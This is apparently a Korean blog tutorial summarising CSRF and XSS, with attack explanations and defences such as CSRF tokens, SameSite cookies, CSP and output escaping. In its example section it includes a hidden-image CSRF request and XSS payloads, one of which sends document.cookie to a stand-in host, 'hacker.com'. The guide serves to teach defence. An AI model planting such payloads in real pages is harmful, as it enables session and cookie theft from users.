
# 🔐 CSRF & XSS 보안 정리 (웹 보안 기본)

웹 서비스를 개발할 때 가장 자주 등장하는 두 가지 보안 취약점인  
**CSRF(Cross-Site Request Forgery)**와 **XSS(Cross-Site Scripting)**를 체계적으로 정리한 문서입니다.

---

# 1. 🛡️ CSRF (Cross-Site Request Forgery)

## 1.1. CSRF란?

사용자가 **인증된 세션을 유지하고 있는 상태**라는 점을 악용해  
**사용자 의도와 무관하게 악성 요청을 보내는 공격**이다.

예시 상황:

1. 사용자가 동시에 은행 사이트와 해커 사이트에 접속
2. 사용자는 은행 사이트에서 로그인된 상태
3. 해커 페이지에 숨겨진 스크립트가 자동 요청 전송
4. 사용자의 세션을 이용해 실제 이체 요청이 실행됨

➡️ **유저는 클릭 한 번 안 해도 계좌이체가 발생할 수 있음**

---

## 1.2. CSRF 공격 예시 코드

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fdq5d5y%2FbtqKDaJ5lre%2FAAAAAAAAAAAAAAAAAAAAAKh2HIt56N4awO9epP1BqRlHTfzvMgfPP0GXZGROnKCM%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3D7ZEOnrwv%252BGy2gtB0yHXpbKwVHwU%253D)

```html
<!-- 사용자가 로그인 상태일 때 -->
<img src="http://examplesite/user/logout" width="0" height="0">
```

페이지에 들어오기만 해도 공격됨. ( 위 코드는 유저를 강제 로그아웃 시키는 것도 가능 )

---

## 1.3. CSRF 방어 방법

### ✔ 1) CSRF Token 사용 (가장 표준)

- 서버가 **난수 기반 Token** (임의의 값) 을 발급
- 사용자가 form이나 API 요청 시 Token을 포함해야 함
- 공격자는 Token을 절대 알 수 없음

### ✔ 2) Referer / Origin 헤더 검증

- 요청이 올바른 도메인에서 왔는지 검증
- `Origin: https://myapp.com` 등 비교

### ✔ 3) SameSite Cookie 옵션 사용

SameSite=Lax 또는 Strict로 설정하면  
**외부 사이트에서 쿠키를 가져다 못 씀**

```http
Set-Cookie: SESSION=abcd; SameSite=Lax; Secure; HttpOnly
```

### ✔ 4) CAPCHA 사용

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FbyY9e3%2FbtqKwRZx3H9%2FAAAAAAAAAAAAAAAAAAAAAF3vOIJuPxuKFwFScxf1hkKt5LC-9jVPfajMo0B8olcD%2Fimg.jpg%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3D6kj3ucPTAVfEzLH0nRQXM4A678w%253D)

- 이미지를 보여주고 그 이미지에 해당하는 문자/숫자/그림이 아니라면 요청을 거부하기 때문에 CSRF 공격을 효과적으로 방어할 수 있다.

---

# 2. 🧨 XSS (Cross-Site Scripting)

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FdjMy4D%2FbtqKxlTDnq4%2FAAAAAAAAAAAAAAAAAAAAADgMipg4Benf27VHSY-AGL_-pAGFs4SX_33Sj5NfbsKk%2Fimg.jpg%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3Dfh%252FlWGjviYhbcnmONWmx9Ewd614%253D)

## 2.1. XSS란?

사용자가 입력한 데이터에 악성 스크립트를 포함하여  
그대로 페이지에 출력되면 스크립트가 실행되는 공격.

➡️ 브라우저가 공격자의 JavaScript를 실행함  
➡️ 쿠키 탈취, 세션 탈취, UI 변조, 악성 리다이렉트 등 발생

---

## 2.2. XSS 종류

### ✔ 1) 저장(Stored) XSS
![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fne2js%2FbtsuGvxEc7d%2FAAAAAAAAAAAAAAAAAAAAAMlhJ3bYzUq2VeMwmPKBJcgcC52CR6KF4b1QAfAN_1_T%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3DFnxrHs4j0P8Yb4fHdzohnjw%252FYGI%253D)
- 악성 스크립트가 **DB에 저장**
- 다른 사용자가 페이지를 볼 때마다 공격 실행

예) 게시판 댓글에 악성 스크립트 삽입

### ✔ 2) 반사(Reflected) XSS
https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fkz3VA%2FbtsoY80xyZ8%2FAAAAAAAAAAAAAAAAAAAAAGfU-pKPyD3OJhtRaNgMGfnNHmst1Mej_3hVsHt4sMb4%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3D2JV2SdTiRoUic%252BTePfHjXPpYdFY%253D
- URL 또는 요청 파라미터를 그대로 응답에 출력할 때 발생  
  예) 검색창 결과에 입력 값 그대로 반영

### ✔ 3) DOM 기반 XSS
![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2Fm0LYC%2FbtsuZUvfJVs%2FAAAAAAAAAAAAAAAAAAAAAJIUEYFQ1gyAiTHaA3gBTP1OZ-D-bwv7G1FioM2Z1B5p%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1764514799%26allow_ip%3D%26allow_referer%3D%26signature%3DqysT6jKbLLKNhDAT7VpdzSdnaeg%253D)
- 서버가 아니라, **프론트 단 JavaScript에서 입력이 조작됨**

---

## 2.3. XSS 공격 예시

```html
<script>alert('Hacked!')</script>
```

게시판에 이걸 넣으면, 페이지를 조회하는 모든 사람에게 alert 팝업 발생.

또는 쿠키 탈취:

```html
<script>
  fetch("https://hacker.com/steal?cookie=" + document.cookie)
</script>
```

---

# 3. 🛡️ XSS 방어 방법

### ✔ 1) 출력 시 HTML Escape (가장 기본)
입력은 막지 말고, **출력할 때 escape**

예)
```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
```

### ✔ 2) Content Security Policy(CSP) 적용

```http
Content-Security-Policy: default-src 'self';
```

- 외부 JS 차단
- inline script 차단

### ✔ 3) 입력 Validation & Sanitizing

- script 태그 제거
- 특수문자 자동 escape
- HTML Purify 등 라이브러리 사용

### ✔ 4) HttpOnly Cookie 사용

- XSS가 발생해도 `document.cookie` 접근 불가능

```http
Set-Cookie: SESSION=abcd; HttpOnly; Secure
```

---

# 4. CSRF와 XSS 비교

| 항목 | CSRF | XSS |
|------|------|-----|
| 공격 대상 | **사용자의 인증 세션** | **브라우저에서 실행되는 JS** |
| 발생 조건 | 사용자가 로그인된 상태 | 입력값이 escape 없이 출력될 때 |
| 목표 | 의도치 않은 요청 실행 | 스크립트 실행을 통한 정보 탈취 |
| 방어법 | CSRF Token, SameSite | Escape, CSP, Sanitizing |

---

# 5. 결론

- CSRF는 **사용자를 대신해 요청을 보내는 공격**
- XSS는 **악성 스크립트를 실행하게 만드는 공격**

둘 다 웹에서 가장 흔히 발생하는 보안 취약점이며  
Spring, Vue, React, Node.js 등 대부분의 환경에서 자동 방어 기능을 제공하지만  
**기본 원리를 이해하고 안전한 코딩을 하는 것이 매우 중요**하다.

